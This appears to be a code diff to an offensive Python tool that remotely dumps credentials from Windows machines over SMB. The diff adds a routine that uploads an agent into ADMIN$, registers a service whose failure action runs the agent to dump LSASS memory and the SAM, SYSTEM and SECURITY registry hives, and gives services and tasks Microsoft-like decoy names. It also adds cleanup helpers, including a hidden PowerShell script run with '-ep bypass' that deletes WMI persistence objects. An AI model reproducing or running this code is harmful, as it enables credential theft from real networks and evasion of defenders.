@@ -7,6 +7,7 @@ Zero registry API calls, zero shadow copies.
 LSASS: uploads native agent, executes via Task Scheduler, receives minidump.
 """
 
+import base64
 import os
 import secrets
 import string
@@ -16,7 +17,7 @@ import threading
 from dataclasses import dataclass, field
 
 from ..smb import SmbSession
-from ..rpc.svcctl import SvcCtl
+from ..rpc.svcctl import SvcCtl, SERVICE_DEMAND_START
 from ..rpc.tsch import TaskScheduler
 
 
@@ -51,6 +52,11 @@ _TASK_PATHS = [
     "\\Microsoft\\Windows\\Servicing\\",
     "\\Microsoft\\Windows\\NetTrace\\",
     "\\Microsoft\\Windows\\DeviceSetup\\",
+]
+
+_SERVICE_NAMES = [
+    "WdiSystemHostSvc", "DiagTrackEvtLog", "UsoCoreMaint",
+    "WinHttpAutoSvc", "NetSetupHostSvc", "CertPropWorker",
 ]
 
 
@@ -93,13 +99,15 @@ class PipeDump:
                 print("[-] Agent not available for hive file read")
                 return result
 
-            mode = 0
-            if need_agent_hives:
-                mode |= 4
+            if need_agent_hives and lsass_pid > 0:
+                print("[*] Deploying agent for hive + LSASS...")
+                self._run_agent(4, 0, result)
+                self._run_agent_delayed(2, lsass_pid, result)
+            elif need_agent_hives:
                 print("[*] Deploying agent for hive file read...")
-            if lsass_pid > 0:
-                mode |= 2
-            self._run_agent(mode, lsass_pid, result)
+                self._run_agent(4, 0, result)
+            elif lsass_pid > 0:
+                self._run_agent_delayed(2, lsass_pid, result)
 
         return result
 
@@ -157,11 +165,12 @@ class PipeDump:
         t.start()
 
         try:
-            raw = self._read_output_file(output_name, timeout=120)
+            raw = self._read_output_file(output_name, timeout=180)
         finally:
             t.join(timeout=10)
             for name in (agent_name,
-                         f"{output_name}.dat", f"{output_name}.tmp"):
+                         f"{output_name}.dat", f"{output_name}.tmp",
+                         f"c{output_name}.dat", f"c{output_name}.tmp"):
                 try:
                     self.session.delete_file("ADMIN$", f"Temp\\{name}")
                 except Exception:
@@ -214,6 +223,131 @@ class PipeDump:
             lsass_data = data[offset:]
             if lsass_data and lsass_data[:4] == b"MDMP":
                 result.lsass_dump = lsass_data
+            elif len(lsass_data) >= 8:
+                marker = struct.unpack_from("<I", lsass_data, 0)[0]
+                _SPAWN_ERRORS = {
+                    0xDEAD0001: "RtlCreateProcessParametersEx",
+                    0xDEAD0002: "NtCreateUserProcess",
+                    0xDEAD0003: "child output file not found",
+                    0xDEAD0004: "no parent process found",
+                }
+                if marker == 0xDEAD0005 and len(lsass_data) >= 8:
+                    bits = struct.unpack_from("<I", lsass_data, 4)[0]
+                    _FUNCS = {1: "NtCreateUserProcess", 2: "NtWaitForSingleObject",
+                              4: "RtlCreateProcessParametersEx", 8: "RtlDestroyProcessParameters"}
+                    missing = [n for b, n in _FUNCS.items() if bits & b]
+                    print(f"    LSASS spawn: resolve failed: {', '.join(missing)}")
+                elif marker in _SPAWN_ERRORS:
+                    desc = _SPAWN_ERRORS[marker]
+                    if marker == 0xDEAD0002 and len(lsass_data) >= 12:
+                        sc = struct.unpack_from("<I", lsass_data, 4)[0]
+                        ppid = struct.unpack_from("<I", lsass_data, 8)[0]
+                        print(f"    LSASS spawn: {desc} (st=0x{sc:08X} parent_pid={ppid})")
+                    elif len(lsass_data) >= 8:
+                        sc = struct.unpack_from("<I", lsass_data, 4)[0]
+                        print(f"    LSASS spawn: {desc} (0x{sc:08X})")
+                    else:
+                        print(f"    LSASS spawn: {desc}")
+                else:
+                    print(f"    LSASS debug: {len(lsass_data)} bytes, marker=0x{marker:08X}")
+            elif lsass_data:
+                print(f"    LSASS debug: {len(lsass_data)} bytes: {lsass_data.hex()}")
+            else:
+                print(f"    LSASS debug: empty section (total={len(data)}, offset={offset})")
+
+    def _run_agent_delayed(self, mode: int, pid: int,
+                           result: AgentResult) -> None:
+        """LSASS dump via SCM failure action with service protocol.
+
+        1. Create service with binPath = agent.exe 16 0 svc (service stub)
+        2. Set failure action = SC_ACTION_RUN_COMMAND with full dump cmd
+        3. Start service → agent registers as service, reaches RUNNING,
+           then exits with error code 1
+        4. SCM detects crash → runs failure command
+        5. Failure command process is created by services.exe (LOCAL)
+        """
+        output_name = secrets.choice(_OUTPUT_PREFIXES) + random_name(6)
+        agent_name = secrets.choice(_AGENT_NAMES)
+        svc_name = secrets.choice(_SERVICE_NAMES) + random_name(4)
+
+        self._upload_agent(agent_name)
+
+        agent_path = f"C:\\Windows\\Temp\\{agent_name}"
+        svc_bin = f"{agent_path} 16 0 svc"
+        failure_cmd = f"{agent_path} {mode} {pid} {output_name}"
+
+        print(f"    [dbg] creating service {svc_name}")
+        with self.session.open_pipe("svcctl") as pipe:
+            svc = SvcCtl(pipe)
+            svc.bind()
+            svc.open_sc_manager()
+            svc_handle = svc.create_service(svc_name, svc_name,
+                                            svc_bin)
+            print("    [dbg] setting failure actions")
+            svc.set_failure_actions(svc_handle, failure_cmd)
+            svc.set_failure_actions_flag(svc_handle, enabled=True)
+            print("    [dbg] starting service")
+            try:
+                svc.start_service(svc_handle)
+            except Exception as e:
+                print(f"    [dbg] start_service: {e}")
+            svc.close_handle(svc_handle)
+
+        print("    [dbg] waiting for failure action")
+        try:
+            raw = self._read_output_file(output_name, timeout=300)
+        except RuntimeError:
+            marker = self._try_read_file("Temp\\_svcrun.tmp")
+            if marker is not None:
+                print("    [dbg] service reached RUNNING (marker found)")
+            else:
+                print("    [dbg] service did NOT reach RUNNING")
+            tmp = self._try_read_file(f"Temp\\{output_name}.tmp")
+            if tmp:
+                print(f"    [dbg] .tmp exists ({len(tmp)} bytes) "
+                      "— agent ran but didn't finish")
+                time.sleep(10)
+                tmp2 = self._try_read_file(f"Temp\\{output_name}.tmp")
+                if tmp2 and len(tmp2) > len(tmp):
+                    print(f"    [dbg] .tmp growing: {len(tmp2)} bytes")
+                elif tmp2:
+                    print(f"    [dbg] .tmp stopped at {len(tmp2)} bytes "
+                          "— agent killed")
+            raise
+        finally:
+            self._delete_service(svc_name)
+            for name in (agent_name, "_svcrun.tmp",
+                         f"{output_name}.dat", f"{output_name}.tmp"):
+                try:
+                    self.session.delete_file("ADMIN$", f"Temp\\{name}")
+                except Exception:
+                    pass
+
+        data = _xor_cipher(raw, output_name)
+        if len(data) < 4 or data[:4] != AGENT_MAGIC_V3:
+            raise RuntimeError("Invalid agent output (bad magic)")
+
+        offset = 4
+
+        for attr in ("system_hive", "sam_hive", "security_hive"):
+            if offset + 4 > len(data):
+                break
+            hlen = struct.unpack_from("<I", data, offset)[0]
+            offset += 4
+            if hlen > 0 and offset + hlen <= len(data):
+                setattr(result, attr, data[offset:offset + hlen])
+                offset += hlen
+
+        if mode & 2:
+            lsass_data = data[offset:]
+            if lsass_data and lsass_data[:4] == b"MDMP":
+                result.lsass_dump = lsass_data
+            elif lsass_data:
+                print(f"    LSASS debug: {len(lsass_data)} bytes: "
+                      f"{lsass_data[:32].hex()}")
+            else:
+                print(f"    LSASS debug: empty section "
+                      f"(total={len(data)}, offset={offset})")
 
     # ── Shared helpers ────────────────────────────────────────
 
@@ -232,6 +366,105 @@ class PipeDump:
                 ts.delete_task(task_path)
             except Exception:
                 pass
+
+    def _exec_via_task_delayed(self, task_path: str, command: str,
+                               arguments: str, delay: int = 5) -> None:
+        with self.session.open_pipe("atsvc") as pipe:
+            ts = TaskScheduler(pipe)
+            ts.bind(self.session.username, self.session.password,
+                    self.session.nt_hash)
+            ts.register_task_delayed(task_path, command, arguments, delay)
+
+    def _delete_service(self, svc_name: str) -> None:
+        try:
+            with self.session.open_pipe("svcctl") as pipe:
+                svc = SvcCtl(pipe)
+                svc.bind()
+                svc.open_sc_manager()
+                h = svc.open_service(svc_name)
+                svc.delete_service(h)
+                svc.close_handle(h)
+        except Exception:
+            pass
+
+    def _cleanup_task(self, task_path: str) -> None:
+        try:
+            with self.session.open_pipe("atsvc") as pipe:
+                ts = TaskScheduler(pipe)
+                ts.bind(self.session.username, self.session.password,
+                        self.session.nt_hash)
+                ts.delete_task(task_path)
+        except Exception:
+            pass
+
+    def _cleanup_wmi(self, wmi_id: str) -> None:
+        """Remove WMI event subscription objects via PowerShell."""
+        ps_name = random_name(10) + ".ps1"
+        ps_cleanup = (
+            f"$n='{wmi_id}'\n"
+            "gwmi -Namespace root\\subscription "
+            "__FilterToConsumerBinding|"
+            "?{$_.Consumer-match $n}|rwmi\n"
+            "gwmi -Namespace root\\subscription "
+            "CommandLineEventConsumer -Filter \"Name='$n'\"|rwmi\n"
+            "gwmi -Namespace root\\subscription "
+            "__EventFilter -Filter \"Name='$n'\"|rwmi\n"
+            "gwmi -Namespace root\\cimv2 "
+            "__IntervalTimerInstruction -Filter \"TimerId='$n'\"|rwmi\n"
+            f"Remove-Item 'C:\\Windows\\Temp\\{ps_name}' -Force\n"
+        )
+        self._write_remote_file(ps_name, ps_cleanup.encode('utf-8'))
+        ps_path = f"C:\\Windows\\Temp\\{ps_name}"
+        cleanup_task = secrets.choice(_TASK_PATHS) + random_name(8)
+        try:
+            self._exec_via_task(
+                cleanup_task,
+                "C:\\Windows\\System32\\WindowsPowerShell"
+                "\\v1.0\\powershell.exe",
+                f"-nop -ep bypass -w hidden -f {ps_path}")
+        except Exception:
+            pass
+
+    def _write_remote_file(self, filename: str, data: bytes) -> None:
+        """Write arbitrary content to C:\\Windows\\Temp\\<filename>."""
+        from smbprotocol.open import (
+            Open, CreateDisposition, CreateOptions,
+            FileAttributes, FilePipePrinterAccessMask,
+            ImpersonationLevel,
+        )
+        tree = self.session.tree_connect("ADMIN$")
+        fh = Open(tree, f"Temp\\{filename}")
+        fh.create(
+            impersonation_level=ImpersonationLevel.Impersonation,
+            desired_access=FilePipePrinterAccessMask.GENERIC_WRITE,
+            file_attributes=FileAttributes.FILE_ATTRIBUTE_NORMAL,
+            share_access=0,
+            create_disposition=CreateDisposition.FILE_OVERWRITE_IF,
+            create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
+        )
+        offset = 0
+        while offset < len(data):
+            chunk = data[offset:offset + 65536]
+            fh.write(chunk, offset)
+            offset += len(chunk)
+        fh.close(get_attributes=False)
+
+    def _exec_via_service(self, svc_name: str, bin_path: str) -> None:
+        with self.session.open_pipe("svcctl") as pipe:
+            svc = SvcCtl(pipe)
+            svc.bind()
+            svc.open_sc_manager()
+            svc_handle = svc.create_service(svc_name, svc_name, bin_path)
+            try:
+                svc.start_service(svc_handle)
+            except Exception:
+                pass
+            time.sleep(2)
+            try:
+                svc.delete_service(svc_handle)
+            except Exception:
+                pass
+            svc.close_handle(svc_handle)
 
     def _upload_agent(self, agent_name: str) -> None:
         from smbprotocol.open import (
